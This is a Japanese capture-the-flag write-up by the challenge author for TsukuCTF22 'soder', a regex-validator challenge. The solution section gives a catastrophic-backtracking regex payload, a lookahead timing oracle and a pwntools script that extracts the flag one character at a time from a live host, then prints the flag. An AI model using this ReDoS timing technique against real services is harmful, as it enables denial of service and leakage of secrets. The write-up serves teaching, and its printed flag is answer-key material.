---
title: soder
description: ReDoSの逆問題
author: Satoki
genre: Misc
solver: 16
point: 498
---

# soder

## 問題文
flagのvalidatorを作ってもらったのですが、同じ応答しか返しません(´;ω;｀)  
`※フラグの形式はTsukuCTF22{[0-9a-z_]+}です。多数のリクエストを許容する問題ですが、数秒間隔をあけてください。`  
`nc 133.130.103.51 31417`  

## 難易度
**medium**  

## 作問にあたって
Webのleaks4bの作問中に非想定解のオラクルとして思いついたものを問題にしました(実は作問時に調べたら、先に思いついていた方がいてしょんぼりしていました)。  
ReDoS問題としては、脆弱なパターンに任意の入力を渡す場合が多いですが、逆を作ってみました(ReDoS checkerで一発なため)。  
爆発するバックトラックを発生させるパターンをうまく作成すれば良いです。  

## 解法
ソースと接続先が与えられる。  
ソースを見ると以下のようであった。  
```python
#!/usr/bin/env python3
import os
import re
from timeout_decorator import timeout

FLAG = os.getenv("FLAG", "TsukuCTF22{dummy_flag}")

@timeout(5)
def flag_validator(pattern):
    re.match(pattern, FLAG)

def yakitori():
    pattern = input("Pattern: ")
    print("I check your pattern.")
    try:
        # This function will be timed out in 5 seconds.
        flag_validator(pattern)
    except:
        pass
    print("Probably valid flag!")

yakitori()
```
パターンをユーザから受け取り、`re.match`をフラグに行い終了している。  
`re.match`の結果を利用していないので、別の手法でフラグを読み取る必要がある。  
ここで、正規表現のパターンを入力から受け取っているためReDoSが行えることがわかる。  
よく知られている脆弱なパターン`^(([a-zA-Z0-9])+)+$`をフラグ形式に合う形で加工した`^((([0-9a-z_CTF{])+)+)+$`を投げてみる。  
```bash
$ time echo 'Test' | nc 133.130.103.51 31417
Pattern: I check your pattern.
Probably valid flag!

real    0m0.687s
user    0m0.006s
sys     0m0.001s
$ time echo '^((([0-9a-z_CTF{])+)+)+$' | nc 133.130.103.51 31417
Pattern: I check your pattern.
Probably valid flag!

real    0m5.562s
user    0m0.005s
sys     0m0.002s
```
応答時間に差があることがわかる。  
つまりこの応答時間からフラグの一致を読み取れる。  
`^(?=フラグ文字列)((([0-9a-z_CTF{])+)+)+$`のように肯定先読みを使って、一致した場合にのみ応答が遅れるペイロードを構成してやればよい。  
以下のwftf.pyを用いる。  
```python
from pwn import *

FLAG = "TsukuCTF22{"

while True:
    for c in "0123456789abcdefghijklmnopqrstuvwxyz_":
        io = remote("133.130.103.51", "31417", level="error")
        io.recvuntil(b"Pattern: ")
        #print(c) # Debug
        io.sendline(f"^(?={FLAG}{c})((([0-9a-z_CTF{{])+)+)+$".encode())
        response = io.recvrepeat(4.5).decode()
        if not "Probably valid flag!" in response:
            FLAG += c
            print(FLAG)
            io.close()
            break
        io.close()
    else:
        FLAG += "}"
        print(FLAG)
        break
```
実行する  
```bash
$ python wftf.py
TsukuCTF22{4
TsukuCTF22{4_
TsukuCTF22{4_w
TsukuCTF22{4_w4
TsukuCTF22{4_w47
TsukuCTF22{4_w47c
TsukuCTF22{4_w47ch
TsukuCTF22{4_w47ch3
TsukuCTF22{4_w47ch3d
TsukuCTF22{4_w47ch3d_
TsukuCTF22{4_w47ch3d_p
TsukuCTF22{4_w47ch3d_p0
TsukuCTF22{4_w47ch3d_p07
TsukuCTF22{4_w47ch3d_p07_
TsukuCTF22{4_w47ch3d_p07_n
TsukuCTF22{4_w47ch3d_p07_n3
TsukuCTF22{4_w47ch3d_p07_n3v
TsukuCTF22{4_w47ch3d_p07_n3v3
TsukuCTF22{4_w47ch3d_p07_n3v3r
TsukuCTF22{4_w47ch3d_p07_n3v3r_
TsukuCTF22{4_w47ch3d_p07_n3v3r_b
TsukuCTF22{4_w47ch3d_p07_n3v3r_b0
TsukuCTF22{4_w47ch3d_p07_n3v3r_b01
TsukuCTF22{4_w47ch3d_p07_n3v3r_b01l
TsukuCTF22{4_w47ch3d_p07_n3v3r_b01l5
TsukuCTF22{4_w47ch3d_p07_n3v3r_b01l5}
```
flagが得られた。  

## TsukuCTF22{4_w47ch3d_p07_n3v3r_b01l5}